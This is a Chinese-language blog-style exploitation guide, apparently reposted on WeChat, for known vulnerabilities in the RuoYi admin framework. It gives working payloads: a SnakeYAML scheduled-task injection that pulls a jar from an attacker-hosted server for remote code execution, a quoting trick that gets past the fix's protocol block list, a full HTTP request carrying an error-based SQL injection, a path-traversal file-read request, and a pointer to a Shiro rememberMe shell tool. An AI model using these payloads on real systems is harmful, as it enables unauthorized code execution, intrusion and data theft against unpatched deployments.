> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/LZxZZ3ZLQg2Wz3xX4iCE8w)

免责声明

  

  

**本文仅用于技术讨论与学习，利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，文章作者不为此承担任何责任。**

**只供对已授权的目标使用测试，对未授权目标的测试作者不承担责任，均由使用本人自行承担。**

![](https://mmbiz.qpic.cn/mmbiz_png/0x3kGZxwKTkyY7BrNkUwicjIkq3F2xlCIgGz7pBpnEMh3rvpbyH2DE2kIKVste0B2yP8TiavoOsuo9sMQKSj9uxQ/640?wx_fmt=png)

若依系统前后台漏洞大全

### **0. 若依项目搭建**

**0.1 修改 / 获取项目启动端口**

![](https://mmbiz.qpic.cn/mmbiz_png/h8P1KUHOKuZsOicOv3wQVDU2ibzFdt2nWyYPIQSqCIGqfAr3DibhUL0EMmngAMmDRhkM4mYpSibHWwuVd6vHDqNufg/640?wx_fmt=png)4fa9f853139bece3a38e80911c209688

**0.2 创建数据库**

启动 mysql 服务, 并创建数据库 ry

![](https://mmbiz.qpic.cn/mmbiz_png/h8P1KUHOKuZsOicOv3wQVDU2ibzFdt2nWygXL7icTr0fw1r45dPibOhX0fHJO19auQlNzJoU2NicF9Mh1aiaWoS1kaJA/640?wx_fmt=png)bae68a7f848b80dd719a20a8f3a92ae0

之后在将这两个 SQL 文件导入到 ry 数据库中

![](https://mmbiz.qpic.cn/mmbiz_png/h8P1KUHOKuZsOicOv3wQVDU2ibzFdt2nWyHC7yEde1eI11v3PQb402pvAA0d6GCc1HJBVR84icJ63nibAXwZUAszdw/640?wx_fmt=png)d227fc1f04c62126b2b46f1dd4cfcfcd

**0.3 修改连接数据库的用户名和密码**

接着修改连接数据库的用户名和密码

![](https://mmbiz.qpic.cn/mmbiz_png/h8P1KUHOKuZsOicOv3wQVDU2ibzFdt2nWyYPIQSqCIGqfAr3DibhUL0EMmngAMmDRhkM4mYpSibHWwuVd6vHDqNufg/640?wx_fmt=png)4fa9f853139bece3a38e80911c209688-1677163359983

然后用 idea 启动即可

![](https://mmbiz.qpic.cn/mmbiz_png/h8P1KUHOKuZsOicOv3wQVDU2ibzFdt2nWyLwPzG6qYy24Zeyetrpad7XibziaJIWXqDJGJprV3xiaTibZcXDVHp4ZVLg/640?wx_fmt=png)f1f0e358cc0bfed1f5e33b28d73d246e

### **1. 后台 - 定时任务 - RCE**

**1.1 漏洞简介 RuoYi<4.6.2**

漏洞影响范围 RuoYi<4.6.2  
简要描述：由于若依后台计划任务处，对于传入的 "调用目标字符串" 没有任何校验，导致攻击者可以调用任意类、方法及参数触发反射执行命令。

**1.2 漏洞利用步骤**

这个跟 springboot 的 Actuator 配置不当引起的 rce 很类似  
也是让其远程加载一个 yml 文件.

接下来具体操作一下…

下载 payload

```
https://github.com/artsploit/yaml-payload


```

![](https://mmbiz.qpic.cn/mmbiz_png/h8P1KUHOKuZsOicOv3wQVDU2ibzFdt2nWy6XP94q7mRAJZHpf9NbgH05fA5AAiaOIF0EN6UYt4CNFQrCPhDibPKzfg/640?wx_fmt=png)4e418ff8db526d9e82fea80d9ec85b30

(mspaint 为打开画图板)  
我们切换目录

![](https://mmbiz.qpic.cn/mmbiz_png/h8P1KUHOKuZsOicOv3wQVDU2ibzFdt2nWyYCWuSCfbr2SAvK3n4bgpWmFn7ETAg7gsWZZGg0gLib0zJuSleqFObnA/640?wx_fmt=png)5773d932fa593e0c3c3f9fce55940759

编写 yaml-payload.yml 文件 (没有的话, 自己创建即可)

```
!!javax.script.ScriptEngineManager [
  !!java.net.URLClassLoader [[
    !!java.net.URL ["http://your-vps-ip/example.jar"]
  ]]
]


```

![](https://mmbiz.qpic.cn/mmbiz_png/h8P1KUHOKuZsOicOv3wQVDU2ibzFdt2nWyomwRLLnaTw3ViaUOg2DFbbmc7JiajcWq6oKeXowbLAWpRuThSHv4wE7Q/640?wx_fmt=png)dabb2009dc56a196e16cad5dca916184

然后在该目录下打开 powershell 或 命令提示框

![](https://mmbiz.qpic.cn/mmbiz_png/h8P1KUHOKuZsOicOv3wQVDU2ibzFdt2nWyyIpRcMfmWFz5jdC9Wbd4buibJVib71QIricw0DJmHK4OaENhJELPOSc4w/640?wx_fmt=png)d5ad93bd6762464050d3c60430121d88

然后输入命令

```
    javac src/artsploit/AwesomeScriptEngineFactory.java    //编译java文件

    jar -cvf yaml-payload.jar -C src/ .             //打包成jar包


```

然后就会生成一个 yaml-payload.jar 的 jar 包

注意第二个命令 yam-payload.jar 的 jar 包要与 yaml-payload.yml 访问的 jar 包名称一一对应  
至此, 我们的 payload 已经修改完成了

这里有, java1.8 编写好的 paylaod

```
https://lmpan.lmboke.com/yaml-payload-master%282%29.zip


```

okk, 这里咱们直接用 python 开启一个简单的 http 服务

![](https://mmbiz.qpic.cn/mmbiz_png/h8P1KUHOKuZsOicOv3wQVDU2ibzFdt2nWyEGHNRaCBq2AB3PIMPickFwwicud0vAJ61CHHfF57P2tWib8AwEwgjAUpA/640?wx_fmt=png)1

我们进入若依 的后台页面之后添加一个定时任务

![](https://mmbiz.qpic.cn/mmbiz_png/h8P1KUHOKuZsOicOv3wQVDU2ibzFdt2nWy0f8Cgd3xrYka9fmiasA3ibgYRNVu9ibiaxEVgVtp8FngMufa6WhbDNbgCg/640?wx_fmt=png)2

然后添加 payload

![](https://mmbiz.qpic.cn/mmbiz_png/h8P1KUHOKuZsOicOv3wQVDU2ibzFdt2nWykVGwhoPP47LTzp0AXJJ1a7ia1YJrgNyk8R4CoDwL2amXjDjVy8zEDzw/640?wx_fmt=png)3

```
org.yaml.snakeyaml.Yaml.load('!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://攻击机ip/yaml-payload.jar"]]]]')


```

不止这一种方法, 我们现在用的是 snakeyaml 方式, 这个我比较熟  
另外两种方式, 好像有

![](https://mmbiz.qpic.cn/mmbiz_png/h8P1KUHOKuZsOicOv3wQVDU2ibzFdt2nWyvZ6GApkxyhLhrHoN4vAwYkwVIurfzibTUGgyVN6Y3AQdYXiad7PYORmQ/640?wx_fmt=png)4

然后添加 cron 表达式:

![](https://mmbiz.qpic.cn/mmbiz_png/h8P1KUHOKuZsOicOv3wQVDU2ibzFdt2nWyCyFPG9CudxQrDnZkFbTaTvGibmPUS16goBoHQErfTG8Fxiaf7cAZZ3hw/640?wx_fmt=png)5

```
0/10 * * * * ?


```

这个 cron 就跟 linux 定时任务一样, 定义每天 / 每周 / 等, 定时启动的时间

配置好之后, 并不会启动定时任务

![](https://mmbiz.qpic.cn/mmbiz_png/h8P1KUHOKuZsOicOv3wQVDU2ibzFdt2nWyQkE9W5rpHzCg2PEdsWJmBatUYLK4J5FIVjZjvzqz6MgqUrhvmNzePg/640?wx_fmt=png)6![](https://mmbiz.qpic.cn/mmbiz_png/h8P1KUHOKuZsOicOv3wQVDU2ibzFdt2nWyVBT2Yc3e12fv0DfqnRVY4L8GqgXbwVPYNLnbGKRTNNz8ibBBT4KVpnA/640?wx_fmt=png)7

(尽量使用 "执行一次" 检验)

执行之后, 即可执行命令 mspaint(弹出画图板)

![](https://mmbiz.qpic.cn/mmbiz_png/h8P1KUHOKuZsOicOv3wQVDU2ibzFdt2nWyLCSXxunSrXxjlKnZOGNIXwOXNIJQt1JHaSRCHnNofiaxpGtl4chjsicw/640?wx_fmt=png)8

1.3 版本 4.6.2<=Ruoyi<4.7.2

这个版本采用了黑名单限制调用字符串

*   • 定时任务屏蔽 ldap 远程调用
    
*   • 定时任务屏蔽 http(s) 远程调用
    
*   • 定时任务屏蔽 rmi 远程调用
    

![](https://mmbiz.qpic.cn/mmbiz_png/h8P1KUHOKuZsOicOv3wQVDU2ibzFdt2nWyxeEH5z3bJPyK0H4bQ7iaMenGbMCe2AbAMww3NBeWHCvdbx3mfS30B2w/640?wx_fmt=png) 9

Bypass  
咱们只需要在屏蔽的协议加上单引号, 接着采用之前的方式  
例如:

```
org.yaml.snakeyaml.Yaml.load(‘!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [“h’t’t’p’://127.0.0.1:88/yaml-payload.jar”]]]]’)


```

加引号

![](https://mmbiz.qpic.cn/mmbiz_png/h8P1KUHOKuZsOicOv3wQVDU2ibzFdt2nWy3Viax6uvsBO1HXa02HyN6GGMu3My5ZobdzNoia6JK2pZnzsLjseXI9LA/640?wx_fmt=png)11

### **2. 后台 - SQL 注入 Ruoyi<4.6.2**

我们访问下图所示的菜单

![](https://mmbiz.qpic.cn/mmbiz_png/h8P1KUHOKuZsOicOv3wQVDU2ibzFdt2nWynV2jTloSGm8MyW16uygDMxlqhGbcyUE33iaia6SNGKDnRkMjZ4BZ40TA/640?wx_fmt=png)12

然后刷新, 拦截, 改包

![](https://mmbiz.qpic.cn/mmbiz_png/h8P1KUHOKuZsOicOv3wQVDU2ibzFdt2nWyhb7C2U95t3JGlW5ibgPRld0mexaDYoThDuVhTGLDYAd4XziaEEtKOYIQ/640?wx_fmt=png)13

```
POST /system/role/list HTTP/1.1
Host: 127.0.0.1
User-Age
nt: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
X-Requested-With: XMLHttpRequest
Content-Length: 181
Origin: http://127.0.0.1
Connection: close
Referer: http://127.0.0.1/system/role
Cookie: UMK8_2132_ulastactivity=fdf6lh5P4KaIR7rPwncVmGmx5z2ymLLNz3o33msgkFJlQ1SdH%2FhR; UMK8_2132_lastcheckfeed=1%7C1637287051; UMK8_2132_nofavfid=1; JSESSIONID=d9eca4a4-7fcd-41ba-9888-75e7c73dc9bf
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin

pageSize=&pageNum=&orderByColumn=&isAsc=&roleName=&roleKey=&status=¶ms[beginTime]=¶ms[endTime]=¶ms[dataScope]=and extractvalue(1,concat(0x7e,(select database()),0x7e))


```

![](https://mmbiz.qpic.cn/mmbiz_png/h8P1KUHOKuZsOicOv3wQVDU2ibzFdt2nWywnElGFjiaIC97khgErC2s9n627sib4o2Q9JGbmGqsyAXrCicYtDHeJQ8g/640?wx_fmt=png)14

(即可触发报错注入, 获取数据库名称)

### **3. 后台 - 任意文件读取 Ruoyi<4.5.1**

![](https://mmbiz.qpic.cn/mmbiz_png/h8P1KUHOKuZsOicOv3wQVDU2ibzFdt2nWyYmTlY34J0DTgKRddIzibVQPib3c4B72z4ib8Fy3bTDsQwatRRKibRJXpyQ/640?wx_fmt=png)15

```
GET /common/download/resource?resource=/profile/../../../../../../../.txt HTTP/1.1

```

(我在 D 盘的根目录创建一个. txt 文件, 其内容为 "这是 D 盘")

### **4. 前台 - shiro-RCE**

shiro 是若依的其中一个组件, 咱们使用 shiro 的经典 rememberMe 漏洞来 getshell

下面使用工具

![](https://mmbiz.qpic.cn/mmbiz_png/h8P1KUHOKuZsOicOv3wQVDU2ibzFdt2nWyTmbHMYwdyVkKNX002URUfafpibxw189ruAxla38Ik6cicrxy7C5suMRw/640?wx_fmt=png)16

(这个工具挺好用, 还能冰蝎 / 蚁剑之类的吗, 从而 getshell)

**回复 “****20230307****" 获取下载地址**

本文转自 https://www.lmboke.com/archives/ruo-yi-xi-tong-qian-hou-tai-lou-dong-da-quan.html，如有侵权，请联系删除。

![](https://mmbiz.qpic.cn/mmbiz_png/0x3kGZxwKTkyY7BrNkUwicjIkq3F2xlCIgGz7pBpnEMh3rvpbyH2DE2kIKVste0B2yP8TiavoOsuo9sMQKSj9uxQ/640?wx_fmt=png)

技术交流

  

  

知识星球

  

  

**致力于红蓝对抗，实战攻防，星球不定时更新内外网攻防渗透技巧，以及最新学习研究成果等。常态化更新最新安全动态。专题更新奇技淫巧小 Tips 及实战案例。  
**

**涉及方向包括 Web 渗透、免杀绕过、内网攻防、代码审计、应急响应、云安全。星球中已发布 200+ 安全资源，针对网络安全成员的普遍水平，并为星友提供了教程、工具、POC&EXP 以及各种学习笔记等等。**

![](https://mmbiz.qpic.cn/mmbiz_png/h8P1KUHOKuYmNKGiac5jzvbTTnwhGXXI8mTRm3Hd4PqNKiaZqbxC4rDiaVvxllH9ic3ibV5YJZYX15mTEw0libLS3AsA/640?wx_fmt=png)

交流群

  

  

关注公众号回复 “**加群**”，添加 Z2OBot 小 K 自动拉你加入 **Z2O 安全攻防交流群**分享更多好东西。

![](https://mmbiz.qpic.cn/mmbiz_png/h8P1KUHOKuYMO5aHRB3TbIy3xezlTAkbFzqIRfZNnicxSC23h1UmemDu9Jq38xrleA6NyoWBu1nAj0nmE6YXEHg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/h8P1KUHOKubEBT4bUSeGS6micuPMlUoN1AxpTK5kx2CY2uDNuyvk0Ce2a82UjWrZxkQneexdbrYBLD3W8g2N4JA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)![](https://mmbiz.qpic.cn/mmbiz_png/h8P1KUHOKubEBT4bUSeGS6micuPMlUoN1vd7kGCw2KeNFhicuQunVRDXhWHtDbp7tVRTL5lxPibjePvPrTVa3RjlQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

  

  

关注我们

  

  

**关注福利：**  

**回复 “****app****" 获取  app 渗透和 app 抓包教程**

**回复 “****渗透字典** **" 获取 针对一些字典重新划分处理，收集了几个密码管理字典生成器用来扩展更多字典的仓库。**

**回复 “****书籍** **" 获取 网络安全相关经典书籍电子版 pdf**

****回复 “资料** **" 获取 网络安全、渗透测试相关资料文档****

往期文章

  

  

[**我是如何摸鱼到红队的**](http://mp.weixin.qq.com/s?__biz=Mzg2ODYxMzY3OQ==&mid=2247489526&idx=1&sn=f52e17f5eb4790395a88a8e64c2a15e4&chksm=cea8fcb6f9df75a03fcf710a7369d8e761a1f8e5ae882709292c49103f22eefeb3a534388cd3&scene=21#wechat_redirect)  

[**命令执行漏洞 [无] 回显 [不] 出网利用技巧**](http://mp.weixin.qq.com/s?__biz=Mzg2ODYxMzY3OQ==&mid=2247488092&idx=1&sn=07ad5a0c09715ca03362bdcacc17f1e1&chksm=cea8f91cf9df700a68c747e2d7185efad50f380f93257293b9b96b5d87dc52cb2082560b0f0f&scene=21#wechat_redirect)  

[**MSSQL 提权全总结**](http://mp.weixin.qq.com/s?__biz=Mzg2ODYxMzY3OQ==&mid=2247488864&idx=1&sn=4888dcec05c0c5c8bc9d3b34136930c0&chksm=cea8fe20f9df7736e03b8544955533ac32671b845ff61d24dc51b5d787960d28256a833350d0&scene=21#wechat_redirect)  

[**Powershell 免杀过 defender 火绒，附自动化工具**](http://mp.weixin.qq.com/s?__biz=Mzg2ODYxMzY3OQ==&mid=2247484469&idx=1&sn=bdac380ee95fd0ef72581a3b60da1443&chksm=cea8ef75f9df66630e2148be842428802b27bcee1cb09748cbc200046742b8052cb6f873e115&scene=21#wechat_redirect)  

[**一篇文章带你学会容器逃逸**](http://mp.weixin.qq.com/s?__biz=Mzg2ODYxMzY3OQ==&mid=2247486670&idx=1&sn=6822dd40dcc20121fce0c42188fcd49a&chksm=cea8e78ef9df6e987896bdbd6b7a96c48992782657680574d7015d72984e7ca67a25a0aeea5d&scene=21#wechat_redirect)  

[**域渗透 | kerberos 认证及过程中产生的攻击**](http://mp.weixin.qq.com/s?__biz=Mzg2ODYxMzY3OQ==&mid=2247483720&idx=1&sn=157c5a4c172315af343bd253bc66da7c&chksm=cea8ea08f9df631e96faca7437a2b1e1900973dfd3b8d3501a666afcd8b05d6d16b8642aabc7&scene=21#wechat_redirect)  

[**通过 DCERPC 和 ntlmssp 获取 Windows 远程主机信息**](http://mp.weixin.qq.com/s?__biz=Mzg2ODYxMzY3OQ==&mid=2247488097&idx=1&sn=cf1e6965c78c9b4636ba15d2bd752655&chksm=cea8f921f9df7037e1e54ae11e03e18562da87309414c0fac3d8bc581bebe69d96cc5fdfce1d&scene=21#wechat_redirect)